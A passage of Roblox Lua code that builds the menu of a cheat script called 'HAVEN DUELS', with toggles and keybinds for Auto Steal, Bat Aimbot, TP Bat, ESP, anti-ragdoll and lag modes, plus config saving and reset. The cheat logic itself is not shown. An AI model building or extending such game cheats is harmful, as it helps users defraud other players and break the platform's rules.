        S.animSelectorLabel.Position = UDim2.new(0, 26, 0.5, -12)
        S.animSelectorLabel.BackgroundTransparency = 1
        S.animSelectorLabel.Text = S.currentAnimPack
        S.animSelectorLabel.TextColor3 = C_WHITE
        S.animSelectorLabel.Font = Enum.Font.GothamBold
        S.animSelectorLabel.TextSize = 10
        S.animSelectorLabel.TextXAlignment = Enum.TextXAlignment.Center
        S.animSelectorLabel.TextTruncate = Enum.TextTruncate.AtEnd
        S.animSelectorLabel.ZIndex = 9
        local right = makeAnimButton(">", 120)
        local function changeAnimPack(direction)
            local index = 1
            for i, entry in ipairs(YF.ANIM_PACK_ORDER) do
                if entry[2] == S.currentAnimPack then index = i; break end
            end
            index = index + direction
            if index < 1 then index = #YF.ANIM_PACK_ORDER end
            if index > #YF.ANIM_PACK_ORDER then index = 1 end
            local packName = YF.ANIM_PACK_ORDER[index][2]
            if packName == "Off" then YF.stopAnimPack() else YF.startAnimPack(packName) end
            if S.animSelectorLabel then S.animSelectorLabel.Text = packName end
            saveConfig()
        end
        left.MouseButton1Click:Connect(function() changeAnimPack(-1) end)
        right.MouseButton1Click:Connect(function() changeAnimPack(1) end)
    end
    S.setAntiLagVisual, _ = mkToggle("Main", pages, "Anti Lag", nil, S.antiLagEnabled, function(on)
        if on then YF.enableAntiLag() else YF.disableAntiLag() end
        saveConfig()
    end, nil)
    mkSection("Main", pages, "Utility")
    S.setUnwalkVisual, _ = mkToggle("Main", pages, "Unwalk", nil, S.unwalkEnabled, function(on)
        if on then startUnwalk() else stopUnwalk() end; saveConfig()
    end, nil)
    S.setAntiRagVisual, _ = mkToggle("Main", pages, "Anti Ragdoll", nil, S.antiRagdollEnabled, function(on)
        toggleAntiRag(on); saveConfig()
    end, nil)
    mkSection("Main", pages, "Actions")
    mkActionRow("Main", pages, "Instant Reset", S.KB.InstaReset, function()
        if _G.InstaReset and _G.InstaReset.Trigger then _G.InstaReset.Trigger() end
    end)
end

local function buildMoveTab(pages)
    mkSection("Move", pages, "Auto Path")
    local setALVis, _ = mkToggle("Move", pages, "Auto Left", S.KB.AutoLeft.kb, false, function(on)
        S.autoLeftEnabled=on
        if on then
            if S.autoRightEnabled then S.autoRightEnabled=false; stopAutoRight(); if S.autoRightSetVisual then S.autoRightSetVisual(false) end end
            if S.batAimbotEnabled then setBatAimbot(false) end
            startAutoLeft()
        else stopAutoLeft() end
        if S.autoLeftSetVisual then S.autoLeftSetVisual(on) end
        S.restartMovement(); updateFloatingButtons(); saveConfig()
    end, function(k,isGp)
        if isGp then S.KB.AutoLeft.gp=k; S.KB.AutoLeft.kb=nil
        else S.KB.AutoLeft.kb=k; S.KB.AutoLeft.gp=nil end; saveConfig()
    end)
    S.autoLeftSetVisual = setALVis
    local setARVis, _ = mkToggle("Move", pages, "Auto Right", S.KB.AutoRight.kb, false, function(on)
        S.autoRightEnabled=on
        if on then
            if S.autoLeftEnabled then S.autoLeftEnabled=false; stopAutoLeft(); if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end end
            if S.batAimbotEnabled then setBatAimbot(false) end
            startAutoRight()
        else stopAutoRight() end
        if S.autoRightSetVisual then S.autoRightSetVisual(on) end
        S.restartMovement(); updateFloatingButtons(); saveConfig()
    end, function(k,isGp)
        if isGp then S.KB.AutoRight.gp=k; S.KB.AutoRight.kb=nil
        else S.KB.AutoRight.kb=k; S.KB.AutoRight.gp=nil end; saveConfig()
    end)
    S.autoRightSetVisual = setARVis
    mkSection("Move", pages, "Steal")
    local setStealVis, _ = mkToggle("Move", pages, "Auto Steal", nil, S.stealActive, function(on)
        S.stealActive = on
        if on then startAutoSteal() else stopAutoSteal() end
        saveConfig()
    end, nil)
    S.setInstaGrab = setStealVis
    S.radInput = mkInput("Move", pages, "Steal Radius", S.Steal.StealRadius, function(v)
        if v>=1 and v<=300 then S.Steal.StealRadius=math.floor(v) end; saveConfig()
    end)
    S.stealDurationBox = mkInput("Move", pages, "Steal Duration", S.Steal.StealDuration, function(v)
        if tonumber(v) then setStealDuration(v); saveConfig() end
    end)
    mkSection("Move", pages, "Actions")
    mkActionRow("Move", pages, "Drop Brainrot", S.KB.DropBrainrot, runDropBrainrot)
    mkActionRow("Move", pages, "TP Down",       S.KB.TPFlor,       runTPFloor)
end

local function buildKeybindsTab(pages)
    mkSection("Keybinds", pages, "Keybind")
    mkActionRow("Keybinds", pages, "Hide GUI",       S.KB.GuiHide,      nil)
    mkActionRow("Keybinds", pages, "Carry Mode",     S.KB.SpeedToggle,  function() S.toggleCarryMode(); S.restartMovement(); updateFloatingButtons(); saveConfig() end)
    mkActionRow("Keybinds", pages, "Lagger Mode",    S.KB.LaggerToggle, function() S.toggleLaggerMode(); S.restartMovement(); updateFloatingButtons(); saveConfig() end)
    mkActionRow("Keybinds", pages, "Bat Aimbot",     S.KB.AutoBat,      function() setBatAimbot(not S.batAimbotEnabled) end)
    mkActionRow("Keybinds", pages, "TP Bat",         S.KB.TpBat,        function()
        local enabled = not S.tpBatEnabled
        setTpBat(enabled)
        if S.tpBatSetVisual then S.tpBatSetVisual(enabled) end
        saveConfig()
    end)
    mkActionRow("Keybinds", pages, "Auto Left",      S.KB.AutoLeft,     function()
        S.autoLeftEnabled=not S.autoLeftEnabled
        if S.autoLeftEnabled then if S.autoRightEnabled then S.autoRightEnabled=false; stopAutoRight(); if S.autoRightSetVisual then S.autoRightSetVisual(false) end end; startAutoLeft() else stopAutoLeft() end
        if S.autoLeftSetVisual then S.autoLeftSetVisual(S.autoLeftEnabled) end; updateFloatingButtons(); saveConfig()
    end)
    mkActionRow("Keybinds", pages, "Auto Right",     S.KB.AutoRight,    function()
        S.autoRightEnabled=not S.autoRightEnabled
        if S.autoRightEnabled then if S.autoLeftEnabled then S.autoLeftEnabled=false; stopAutoLeft(); if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end end; startAutoRight() else stopAutoRight() end
        if S.autoRightSetVisual then S.autoRightSetVisual(S.autoRightEnabled) end; updateFloatingButtons(); saveConfig()
    end)
    mkActionRow("Keybinds", pages, "Drop Brainrot",  S.KB.DropBrainrot, runDropBrainrot)
    mkActionRow("Keybinds", pages, "TP Down",        S.KB.TPFlor,       runTPFloor)
    mkActionRow("Keybinds", pages, "Instant Reset", S.KB.InstaReset, function()
        if _G.InstaReset and _G.InstaReset.Trigger then _G.InstaReset.Trigger() end
    end)
end

local function resetConfigToDefaults()
    pcall(stopAutoSteal)
    pcall(stopBatCounter)
    pcall(stopMedusaCounter)
    pcall(stopUnwalk)
    pcall(stopHoldJump)
    pcall(stopAutoLeft)
    pcall(stopAutoRight)
    pcall(stopBatAimbot)
    pcall(setTpBat, false)
    pcall(stopAntiRagdoll)
    pcall(stopFPSBoost)
    pcall(YF.stopAntiFling)
    pcall(YF.stopBodyLock)
    pcall(YF.disableAntiLag)
    pcall(YF.stopAnimPack)
    pcall(disableStretch)
    pcall(disableVividGraphics)
    pcall(toggleESP, false)

    S.NS, S.CS, S.LS, S.LCS = 70, 45, 22, 22
    S.speedMode, S.laggerMode = false, 0
    S.antiRagdollEnabled = false
    S.medusaCounterEnabled = false
    S.unwalkEnabled = false
    S.autoLeftEnabled, S.autoRightEnabled = false, false
    S.batAimbotEnabled, S.batCounterEnabled = false, false
    S.fpsBoostEnabled = false
    S.stealActive = false
    S.espEnabled = false
    S.antiFlingEnabled = false
    S.bodyLockEnabled, S.bodyLockRange = false, 20
    S.antiLagEnabled = false
    S.vividGraphicsEnabled = false
    S.stretchEnabled, S.stretchFOV = false, 120
    S.skyTheme, S.krobloxMode = "Off", "Off"
    if S.setBatSkin then pcall(S.setBatSkin, "Off", false) end
    S.batSkinMode = "Off"
    if S.setDisplaySkin then pcall(S.setDisplaySkin, "Off", false) else S.displaySkin="Off"; S.customSkinEnabled=false end
    S.currentAnimPack = "Off"
    S.hideOpiumButtonsEnabled = false
    S.lockUIEnabled = false
    S.Steal.StealRadius, S.Steal.StealDuration = 61, 1.3
    S.tpDownHeightTrigger = 20
    local function resetKey(name, kb, gp)
        if S.KB[name] then S.KB[name].kb, S.KB[name].gp = kb, gp end
    end
    resetKey("DropBrainrot", Enum.KeyCode.X, Enum.KeyCode.ButtonR2)
    resetKey("AutoLeft", Enum.KeyCode.Z, Enum.KeyCode.DPadLeft)
    resetKey("AutoRight", Enum.KeyCode.C, Enum.KeyCode.DPadRight)
    resetKey("AutoBat", Enum.KeyCode.E, Enum.KeyCode.ButtonY)
    resetKey("TpBat", Enum.KeyCode.V, nil)
    resetKey("TPFlor", Enum.KeyCode.F, Enum.KeyCode.ButtonA)
    resetKey("GuiHide", Enum.KeyCode.LeftControl, Enum.KeyCode.ButtonSelect)
    resetKey("SpeedToggle", Enum.KeyCode.Q, Enum.KeyCode.DPadUp)
    resetKey("LaggerToggle", Enum.KeyCode.R, Enum.KeyCode.DPadDown)
    resetKey("InstaReset", Enum.KeyCode.H, nil)
    S.backgroundAssetId = DEFAULT_BACKGROUND_ID
    S.mobileButtonPositions = {}
    S.floatingFreeButtonPositions = {}

    pcall(applyCustomSky, "Off")
    pcall(_G._VisionApplyKroblox, "Off")
    if S.displaySkinSelectorLabel then S.displaySkinSelectorLabel.Text="Off" end
    if S.customSkinVisual then S.customSkinVisual(false) end
    pcall(setUILock, false)
    if S.floatingPanelGui then S.floatingPanelGui.Enabled = true end
    pcall(function()
        local pg = LP:FindFirstChild("PlayerGui")
        local old = pg and pg:FindFirstChild("OpiumGGV5_2")
        if old then old.Enabled = true end
    end)
    if S.backgroundImage then
        S.backgroundImage.Image = (S.backgroundAssetId == "BLACK") and "" or ("rbxassetid://" .. tostring(S.backgroundAssetId))
    end
    if S.speedClk then S.speedClk(false) end
    if S.setLaggerVisual then S.setLaggerVisual(false) end
    if S.setAntiRagVisual then S.setAntiRagVisual(false) end
    if S.setFpsVisual then S.setFpsVisual(false) end
    if S.setBatCounterVisual then S.setBatCounterVisual(false) end
    if S.batAimbotSetVisual then S.batAimbotSetVisual(false) end
    if S.tpBatSetVisual then S.tpBatSetVisual(false) end
    if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end
    if S.autoRightSetVisual then S.autoRightSetVisual(false) end
    if S.setAntiFlingVisual then S.setAntiFlingVisual(false) end
    if S.bodyLockSetVisual then S.bodyLockSetVisual(false) end
    if S.setVividVisual then S.setVividVisual(false) end
    if S.setStretchVisual then S.setStretchVisual(false) end
    if S.setMedusaVisual then S.setMedusaVisual(false) end
    if S.setUnwalkVisual then S.setUnwalkVisual(false) end
    if S.setAntiLagVisual then S.setAntiLagVisual(false) end
    if S.setHideOpiumButtons2 then S.setHideOpiumButtons2(false) end
    S.refreshSpeedModeLabel()
    resetFloatingPanel()
    if updateFloatingButtons then updateFloatingButtons() end
    saveConfig()
end

local function buildConfigTab(pages)
    mkSection("Config", pages, "General")
    S.setLockUI_Visual2, _ = mkToggle("Config", pages, "Lock UI", nil, S.lockUIEnabled or false, function(on)
        S.lockUIEnabled=on; setUILock(on); saveConfig()
    end, nil)
    S.setHideOpiumButtons2, _ = mkToggle("Config", pages, "Hide Buttons", nil, S.hideOpiumButtonsEnabled or false, function(on)
        S.hideOpiumButtonsEnabled=on
        if S.floatingPanelGui then S.floatingPanelGui.Enabled=not on end
        pcall(function()
            local pg=LP:FindFirstChild("PlayerGui")
            if pg then local og=pg:FindFirstChild("OpiumGGV5_2"); if og then og.Enabled=not on end end
        end)
        saveConfig()
    end, nil)
    mkSection("Config", pages, "Background")
    local backgroundCard = mkCard("Config", pages, 88)
    local tileWidth, tileHeight, tileGap = 74, 68, 8
    local selectedStrokes = {}

    local function selectBackground(assetId)
        local valid = false
        for _, optionId in ipairs(BACKGROUND_OPTIONS) do
            if assetId == optionId then valid = true; break end
        end
        if not valid then return end

        S.backgroundAssetId = assetId
        if S.backgroundImage then
            S.backgroundImage.Image = (assetId == "BLACK") and "" or ("rbxassetid://" .. assetId)
        end
        for optionIndex, stroke in ipairs(selectedStrokes) do
            local selected = BACKGROUND_OPTIONS[optionIndex] == assetId
            stroke.Color = selected and C_WHITE or C_SEPARATOR_GRAY
            stroke.Thickness = selected and 3 or 1
            stroke.Transparency = selected and 0 or 0.3
        end
        saveConfig()
    end

    for index, assetId in ipairs(BACKGROUND_OPTIONS) do
        local tile = Instance.new("ImageButton", backgroundCard)
        tile.Name = "BackgroundOption" .. index
        tile.Size = UDim2.fromOffset(tileWidth, tileHeight)
        tile.Position = UDim2.fromOffset(10 + (index - 1) * (tileWidth + tileGap), 10)
        tile.BackgroundColor3 = C_CARD
        tile.BackgroundTransparency = 0
        tile.BorderSizePixel = 0
        tile.Image = ""
        tile.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        tile.ScaleType = Enum.ScaleType.Crop
        tile.AutoButtonColor = false
        tile.ZIndex = 4
        Instance.new("UICorner", tile).CornerRadius = UDim.new(0, 10)

        local stroke = Instance.new("UIStroke", tile)
        stroke.Color = (S.backgroundAssetId == assetId) and C_WHITE or C_SEPARATOR_GRAY
        stroke.Thickness = (S.backgroundAssetId == assetId) and 3 or 1
        stroke.Transparency = (S.backgroundAssetId == assetId) and 0 or 0.3
        selectedStrokes[index] = stroke

        local number = Instance.new("TextLabel", tile)
        number.Name = "OptionNumber"
        number.AnchorPoint = Vector2.new(0.5, 1)
        number.Position = UDim2.new(0.5, 0, 1, -3)
        number.Size = UDim2.new(1, -8, 0, 20)
        number.BackgroundTransparency = 1
        number.Text = tostring(index)
        number.TextColor3 = Color3.fromRGB(255, 255, 255)
        number.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        number.TextStrokeTransparency = 0.15
        number.Font = Enum.Font.GothamBold
        number.TextSize = 14
        number.ZIndex = 5
        tile.Activated:Connect(function() selectBackground(assetId) end)
    end


    mkSection("Config", pages, "Config")
    local function addConfigManagementButton(text, callback, mode)
        local card = mkCard("Config", pages, 44)
        local button = Instance.new("TextButton", card)
        button.Name = "ConfigManagement_" .. text:gsub("%s+", "")
        button.Size = UDim2.new(1, -20, 0.82, 0)
        button.Position = UDim2.new(0, 10, 0.09, 0)
        button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        button.BorderSizePixel = 0
        button.Text = ""
        button.AutoButtonColor = false
        button.ZIndex = 8
        Instance.new("UICorner", button).CornerRadius = UDim.new(1, 0)

        local gradient = Instance.new("UIGradient", button)
        gradient.Rotation = 90
        if mode == "save" then
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(120, 120, 130)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(60, 60, 70)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(20, 20, 26)),
            })
        elseif mode == "reset" then
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(80, 90, 110)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(45, 55, 75)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(18, 22, 32)),
            })
        else
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(180, 45, 80)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(120, 25, 55)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(60, 10, 30)),
            })
        end

        local stroke = Instance.new("UIStroke", button)
        stroke.Thickness = 1.5
        stroke.Transparency = 0.35
        stroke.Color = mode == "save" and Color3.fromRGB(200, 200, 215)
            or mode == "reset" and Color3.fromRGB(150, 175, 210)
            or Color3.fromRGB(255, 130, 170)

        local label = Instance.new("TextLabel", button)
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.Font = Enum.Font.GothamBlack
        label.TextSize = 13
        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        label.TextStrokeTransparency = 0.55
        label.ZIndex = 9

        button.MouseEnter:Connect(function()
            TS_G:Create(button, TweenInfo.new(0.14, Enum.EasingStyle.Quad), {
                Size = UDim2.new(1, -12, 0.92, 0),
                Position = UDim2.new(0, 6, 0.04, 0),
            }):Play()
            TS_G:Create(stroke, TweenInfo.new(0.14), {Transparency = 0.05}):Play()
        end)
        button.MouseLeave:Connect(function()
            TS_G:Create(button, TweenInfo.new(0.14, Enum.EasingStyle.Quad), {
                Size = UDim2.new(1, -20, 0.82, 0),
                Position = UDim2.new(0, 10, 0.09, 0),
            }):Play()
            TS_G:Create(stroke, TweenInfo.new(0.14), {Transparency = 0.35}):Play()
        end)

        if mode == "save" then
            button.MouseButton1Click:Connect(function()
                local ok, reason = saveConfig()
                label.Text = ok and "SAVED ✓" or ("ERROR: " .. tostring(reason or "NO FILE ACCESS"))
                task.delay(1.2, function()
                    if label and label.Parent then label.Text = text end
                end)
            end)
        elseif mode == "reset" then
            local resetDebounce = false
            button.MouseButton1Click:Connect(function()
                if resetDebounce then return end
                resetDebounce = true
                pcall(resetFloatingPanel)
                label.Text = "RESET ✓"
                task.delay(1.2, function()
                    if label and label.Parent then
                        label.Text = text
                        resetDebounce = false
                    end
                end)
            end)
        else
            local deleteState = 0
            local deleteDebounce = false
            button.MouseButton1Click:Connect(function()
                if deleteDebounce then return end
                if deleteState == 0 then
                    deleteState = 1
                    label.Text = "CONFIRM?"
                    gradient.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(230, 70, 100)),
                        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(180, 40, 70)),
                        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(90, 15, 40)),
                    })
                    task.delay(2, function()
                        if button and button.Parent and deleteState == 1 then
                            deleteState = 0
                            label.Text = text
                            gradient.Color = ColorSequence.new({
                                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(180, 45, 80)),
                                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(120, 25, 55)),
                                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(60, 10, 30)),
                            })
                        end
                    end)
                else
                    deleteDebounce = true
                    local ok = pcall(resetConfigToDefaults)
                    label.Text = ok and "DELETED ✓" or "ERROR"
                    deleteState = 0
                    task.delay(1.5, function()
                        if label and label.Parent then
                            label.Text = text
                            gradient.Color = ColorSequence.new({
                                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(180, 45, 80)),
                                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(120, 25, 55)),
                                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(60, 10, 30)),
                            })
                            deleteDebounce = false
                        end
                    end)
                end
            end)
        end
        return button
    end
    addConfigManagementButton("SAVE CONFIG", saveConfig, "save")
    addConfigManagementButton("RESET POSITIONS", resetFloatingPanel, "reset")
    addConfigManagementButton("DELETE SETTINGS", resetConfigToDefaults, "delete")
end -- close buildConfigTab

-- Disable health bar
pcall(function() game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Health, false) end)
LP.CharacterAdded:Connect(function()
    pcall(function() game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Health, false) end)
end) -- close LP.CharacterAdded:Connect

local function buildGui()
    local old = game:GetService("CoreGui"):FindFirstChild("HAVEN DUELS")
    if old then old:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "HAVEN DUELS"; gui.ResetOnSpawn = false
    gui.DisplayOrder = 100; gui.IgnoreGuiInset = true
    if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
        gui.Parent = LP:WaitForChild("PlayerGui")
    end

    -- Outer drag frame
    local outer = Instance.new("Frame", gui)
    outer.Name = "Outer"
    outer.AnchorPoint = Vector2.new(0, 0.5)
    outer.Position = UDim2.new(0, 14, 0.5, 0)
    outer.Size = UDim2.fromOffset(PANEL_W, PANEL_H)
    outer.BackgroundTransparency = 1; outer.BorderSizePixel = 0
    outer.ClipsDescendants = false
    outer.Visible = false
    S.mainMenuFrame = outer
    -- El panel no se arrastra desde toda su superficie: eso interfería con
    -- los gestos de toque y desplazamiento de las páginas/tabs.
    applyPhoneGuiScale(outer, S.phoneGuiScale, "mainGuiScaleObj")
    if S.IS_TOUCH_DEVICE then outer.Position = UDim2.new(0,8,0.5,0) end
    S.menuOpenPosition = outer.Position

    -- Inner panel (glassmorphism)
    local main = Instance.new("Frame", outer)
    main.Name = "Main"; main.Size = UDim2.new(1,0,1,0)
    main.BackgroundColor3 = C_BG; main.BackgroundTransparency = 0.45
    main.BorderSizePixel = 0; main.ClipsDescendants = true; main.ZIndex = 1
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 22)
    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Color = Color3.fromRGB(51, 51, 51); mainStroke.Thickness = 1.4; mainStroke.Transparency = 0.2
    mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    -- Fondo fijo negro: no se cargan imágenes de fondo.
    local bgImg = Instance.new("ImageLabel", main)
    bgImg.Size = UDim2.new(1,0,1,0); bgImg.BackgroundTransparency = 1
    bgImg.BorderSizePixel = 0; bgImg.ZIndex = 0
    bgImg.Image = ((S.backgroundAssetId or DEFAULT_BACKGROUND_ID) == "BLACK") and "" or ("rbxassetid://" .. (S.backgroundAssetId or DEFAULT_BACKGROUND_ID))
    bgImg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bgImg.ImageTransparency = 0
    bgImg.ScaleType = Enum.ScaleType.Crop
    bgImg.ImageColor3 = Color3.fromRGB(255, 255, 255)
    S.backgroundImage = bgImg
    Instance.new("UICorner", bgImg).CornerRadius = UDim.new(0, 22)

    -- Overlay negro opaco.
    local bgOverlay = Instance.new("Frame", main)
    bgOverlay.Size = UDim2.new(1,0,1,0); bgOverlay.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
    bgOverlay.BackgroundTransparency = 0; bgOverlay.BorderSizePixel = 0; bgOverlay.ZIndex = 0
    Instance.new("UICorner", bgOverlay).CornerRadius = UDim.new(0, 22)
    local overlayGrad = Instance.new("UIGradient", bgOverlay)
    overlayGrad.Rotation = 180
    overlayGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1),
        NumberSequenceKeypoint.new(0.4, 0.35),
        NumberSequenceKeypoint.new(1, 0.6),
    })

    -- Header (premium gradient + glassmorphism)
    local header = Instance.new("Frame", main)
    header.Name = "Header"; header.Size = UDim2.new(1,0,0,HEADER_H)
    header.BackgroundColor3 = C_HEADER; header.BackgroundTransparency = 0.15
    header.BorderSizePixel = 0; header.ZIndex = 5; header.ClipsDescendants = true
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 22)
    -- Arrastrar solo desde el encabezado y mover el panel completo.
    makeDraggable(header, false, outer)
    local headerGrad = Instance.new("UIGradient", header)
    headerGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(16, 9, 22)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(12, 8, 16)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 9, 20)),
    })
    headerGrad.Rotation = 90

    local titleImage = Instance.new("TextLabel", header)
    titleImage.Name = "MenuTitleImage"
    titleImage.AnchorPoint = Vector2.new(0, 0.5)
    titleImage.Position = UDim2.fromOffset(18, 38)
    titleImage.Size = UDim2.fromOffset(250, 52)
    titleImage.BackgroundTransparency = 1
    titleImage.Text = "HAVEN DUELS"
    titleImage.TextColor3 = Color3.fromRGB(225, 185, 255)
    titleImage.Font = Enum.Font.GothamBlack
    titleImage.TextSize = 25
    titleImage.TextXAlignment = Enum.TextXAlignment.Left
    titleImage.TextStrokeTransparency = 0.35
    titleImage.TextStrokeColor3 = Color3.fromRGB(55, 10, 85)
    titleImage.ZIndex = 6
    local titleGrad = Instance.new("UIGradient", titleImage)
    titleGrad.Rotation = 0
    titleGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 240, 255)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(218, 150, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(155, 65, 235)),
    })

    local subtitle = Instance.new("TextLabel", header)
    subtitle.Name = "Subtitle"
    subtitle.Position = UDim2.fromOffset(19, 62)
    subtitle.Size = UDim2.fromOffset(170, 16)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "CONTROL CENTER  •  V2"
    subtitle.Font = Enum.Font.GothamMedium
    subtitle.TextSize = 9
    subtitle.TextColor3 = Color3.fromRGB(145, 120, 165)
    subtitle.TextXAlignment = Enum.TextXAlignment.Left
    subtitle.ZIndex = 6

    local statusPill = Instance.new("Frame", header)
    statusPill.Name = "StatusPill"
    statusPill.AnchorPoint = Vector2.new(1, 0)
    statusPill.Position = UDim2.fromOffset(PANEL_W - 50, 12)
    statusPill.Size = UDim2.fromOffset(76, 22)
    statusPill.BackgroundColor3 = Color3.fromRGB(25, 12, 35)
    statusPill.BackgroundTransparency = 0.05
    statusPill.BorderSizePixel = 0
    statusPill.ZIndex = 7
    Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
    local statusStroke = Instance.new("UIStroke", statusPill)
    statusStroke.Color = Color3.fromRGB(145, 55, 210)
    statusStroke.Transparency = 0.35
    statusStroke.Thickness = 1
    local statusDot = Instance.new("Frame", statusPill)
    statusDot.Size = UDim2.fromOffset(6, 6)
    statusDot.Position = UDim2.fromOffset(9, 8)
    statusDot.BackgroundColor3 = Color3.fromRGB(180, 90, 255)
    statusDot.BorderSizePixel = 0
    statusDot.ZIndex = 8
    Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
    local statusText = Instance.new("TextLabel", statusPill)
    statusText.Position = UDim2.fromOffset(20, 0)
    statusText.Size = UDim2.fromOffset(50, 22)
    statusText.BackgroundTransparency = 1
    statusText.Text = "ONLINE"
    statusText.Font = Enum.Font.GothamBold
    statusText.TextSize = 8
    statusText.TextColor3 = Color3.fromRGB(225, 195, 240)
    statusText.TextXAlignment = Enum.TextXAlignment.Left
    statusText.ZIndex = 8

    local carryPill = Instance.new("Frame", header)
    carryPill.Name = "AutoCarryStatus"
    carryPill.Position = UDim2.fromOffset(192, 58)
    carryPill.Size = UDim2.fromOffset(91, 20)
    carryPill.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    carryPill.BackgroundTransparency = 0.05
    carryPill.BorderSizePixel = 0
    carryPill.ZIndex = 7
    Instance.new("UICorner", carryPill).CornerRadius = UDim.new(1, 0)
    local carryStroke = Instance.new("UIStroke", carryPill)
    carryStroke.Color = Color3.fromRGB(75, 60, 85)
    carryStroke.Transparency = 0.25
    local carryText = Instance.new("TextLabel", carryPill)
    carryText.Size = UDim2.new(1, -8, 1, 0)
    carryText.Position = UDim2.fromOffset(4, 0)
    carryText.BackgroundTransparency = 1
    carryText.Text = "AUTO CARRY  OFF"
    carryText.Font = Enum.Font.GothamBold
    carryText.TextSize = 8
    carryText.TextColor3 = Color3.fromRGB(150, 150, 160)
    carryText.ZIndex = 8

    task.spawn(function()
        while gui.Parent do
            local on = S.autoCarryEnabled == true
            local active = S.autoCarryActive == true
            carryText.Text = active and "AUTO CARRY  ACTIVE" or (on and "AUTO CARRY  ON" or "AUTO CARRY  OFF")
            carryText.TextColor3 = active and Color3.fromRGB(235, 205, 255) or (on and Color3.fromRGB(205, 160, 235) or Color3.fromRGB(150, 150, 160))
            carryStroke.Color = active and Color3.fromRGB(190, 95, 255) or (on and Color3.fromRGB(120, 70, 150) or Color3.fromRGB(75, 60, 85))
            task.wait(0.15)
        end
    end)

    -- Close button (premium style)
    local closeBtn = Instance.new("TextButton", header)
    closeBtn.AnchorPoint = Vector2.new(1,0.5); closeBtn.Position = UDim2.fromOffset(PANEL_W-14,36)
    closeBtn.Size = UDim2.fromOffset(28,28); closeBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
    closeBtn.BorderSizePixel = 0; closeBtn.Text = "-"; closeBtn.TextColor3 = Color3.fromRGB(141, 141, 141)
    closeBtn.Font = Enum.Font.GothamBold; closeBtn.TextSize = 18; closeBtn.ZIndex = 10
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0,10)
    local closeBtnStroke = Instance.new("UIStroke", closeBtn)
    closeBtnStroke.Color = Color3.fromRGB(59, 59, 59); closeBtnStroke.Thickness = 1; closeBtnStroke.Transparency = 0.3
    closeBtn.MouseEnter:Connect(function()
        TS_G:Create(closeBtn,TweenInfo.new(0.15,Enum.EasingStyle.Quad),{BackgroundColor3=C_HIGHLIGHT,TextColor3=C_WHITE}):Play()
        TS_G:Create(closeBtnStroke,TweenInfo.new(0.15),{Color=C_HIGHLIGHT_BRIGHT,Transparency=0}):Play()
    end)
    closeBtn.MouseLeave:Connect(function()
        TS_G:Create(closeBtn,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{BackgroundColor3=Color3.fromRGB(28, 28, 28),TextColor3=Color3.fromRGB(141, 141, 141)}):Play()
        TS_G:Create(closeBtnStroke,TweenInfo.new(0.2),{Color=Color3.fromRGB(59, 59, 59),Transparency=0.3}):Play()
    end)

    -- Header separator (premium animated silver glow line)
    local hSep = Instance.new("Frame", main)
    hSep.Size = UDim2.new(1,-20,0,2); hSep.Position = UDim2.fromOffset(10,HEADER_H)
    hSep.BackgroundColor3 = Color3.fromRGB(218, 155, 255); hSep.BackgroundTransparency = 0.15
    hSep.BorderSizePixel = 0; hSep.ZIndex = 4
    Instance.new("UICorner", hSep).CornerRadius = UDim.new(1,0)
    local hSepG = Instance.new("UIGradient", hSep)
    hSepG.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 230, 255)),
        ColorSequenceKeypoint.new(0.46, Color3.fromRGB(218, 155, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(154, 62, 230)),
